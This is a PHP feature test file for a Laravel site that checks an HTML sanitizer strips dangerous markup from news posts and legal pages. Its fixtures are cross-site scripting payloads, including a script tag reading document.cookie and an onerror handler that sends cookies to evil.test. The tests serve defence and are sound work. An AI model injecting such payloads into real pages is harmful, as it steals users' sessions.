<?php

namespace Tests\Feature;

use App\Models\LegalPage;
use App\Models\Post;
use App\Models\User;
use App\Models\UserRole;
use App\Services\HtmlSanitizer;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class HtmlSanitizationTest extends TestCase
{
    use RefreshDatabase;

    private function actingAsEditor(): User
    {
        $editor = User::factory()->create();
        UserRole::create(['user_id' => $editor->id, 'role' => 'editor']);
        $this->actingAs($editor);
        return $editor;
    }

    private function actingAsAdmin(): User
    {
        $admin = User::factory()->create();
        UserRole::create(['user_id' => $admin->id, 'role' => 'admin']);
        $this->actingAs($admin);
        return $admin;
    }

    // ── Unidad: el sanitizador en sí ──

    public function test_sanitizer_strips_script_tags(): void
    {
        $clean = HtmlSanitizer::clean('<p>Hola</p><script>alert(document.cookie)</script>');

        $this->assertStringNotContainsString('<script', $clean);
        $this->assertStringContainsString('<p>Hola</p>', $clean);
    }

    public function test_sanitizer_strips_inline_event_handlers(): void
    {
        $clean = HtmlSanitizer::clean('<p onmouseover="alert(1)">Hola</p><img src="x.jpg" onerror="alert(2)">');

        $this->assertStringNotContainsString('onmouseover', $clean);
        $this->assertStringNotContainsString('onerror', $clean);
    }

    public function test_sanitizer_strips_javascript_urls(): void
    {
        $clean = HtmlSanitizer::clean('<a href="javascript:alert(1)">click</a>');

        $this->assertStringNotContainsString('javascript:', $clean);
    }

    public function test_sanitizer_keeps_safe_formatting_tags(): void
    {
        $clean = HtmlSanitizer::clean('<p><strong>Importante</strong>: <a href="https://example.com">enlace</a></p>');

        $this->assertStringContainsString('<strong>Importante</strong>', $clean);
        $this->assertStringContainsString('href="https://example.com"', $clean);
    }

    public function test_sanitizer_returns_empty_string_for_null(): void
    {
        $this->assertSame('', HtmlSanitizer::clean(null));
    }

    // ── Integración: noticias ──

    public function test_post_content_is_sanitized_on_store(): void
    {
        $this->actingAsEditor();

        $this->post(route('admin.posts.store'), [
            'title' => 'Noticia de prueba',
            'type' => 'noticia',
            'status' => 'publicado',
            'content' => '<p>Contenido real</p><script>alert(1)</script>',
        ])->assertRedirect();

        $post = Post::where('title', 'Noticia de prueba')->first();
        $this->assertNotNull($post);
        $this->assertStringNotContainsString('<script', $post->content);
        $this->assertStringContainsString('Contenido real', $post->content);
    }

    public function test_post_content_is_sanitized_on_update(): void
    {
        $this->actingAsEditor();
        $post = Post::create([
            'title' => 'Noticia existente',
            'slug' => 'noticia-existente',
            'type' => 'noticia',
            'status' => 'publicado',
            'content' => '<p>Original</p>',
        ]);

        $this->put(route('admin.posts.update', $post), [
            'title' => 'Noticia existente',
            'type' => 'noticia',
            'status' => 'publicado',
            'content' => '<img src=x onerror="fetch(\'https://evil.test/steal?c=\'+document.cookie)">',
        ])->assertRedirect();

        $post->refresh();
        $this->assertStringNotContainsString('onerror', $post->content);
    }

    public function test_public_news_page_never_renders_a_script_tag_even_if_it_bypassed_sanitization(): void
    {
        // Defensa en profundidad: si por algún motivo quedó HTML peligroso guardado
        // (dato legado, bug futuro), la página pública nunca debería servirlo.
        $post = Post::create([
            'title' => 'Noticia con script legado',
            'slug' => 'noticia-con-script-legado',
            'type' => 'noticia',
            'status' => 'publicado',
            'content' => HtmlSanitizer::clean('<p>Texto</p><script>alert(1)</script>'),
            'published_at' => now(),
        ]);

        $response = $this->get(route('posts.show', $post->slug));
        $response->assertOk();
        // La página en sí trae sus propios <script> (bundle, analytics); lo que
        // importa es que el payload malicioso no sobreviva.
        $response->assertDontSee('alert(1)', false);
    }

    // ── Integración: páginas legales ──

    public function test_legal_page_content_is_sanitized_on_update(): void
    {
        $this->actingAsAdmin();

        $this->patch(route('admin.legal.update', 'compra'), [
            'title' => 'Políticas de compra',
            'content' => '<p>Texto legal</p><script>document.location="https://evil.test"</script>',
        ])->assertRedirect();

        $page = LegalPage::where('key', 'compra')->first();
        $this->assertNotNull($page);
        $this->assertStringNotContainsString('<script', $page->content);
        $this->assertStringContainsString('Texto legal', $page->content);
    }

    public function test_public_legal_page_never_renders_a_script_tag(): void
    {
        LegalPage::create([
            'key' => 'compra',
            'title' => 'Políticas de compra',
            'content' => HtmlSanitizer::clean('<p>Texto</p><script>alert(1)</script>'),
            'is_active' => true,
        ]);

        $response = $this->get(route('legal.compra'));
        $response->assertOk();
        $response->assertDontSee('alert(1)', false);
    }
}
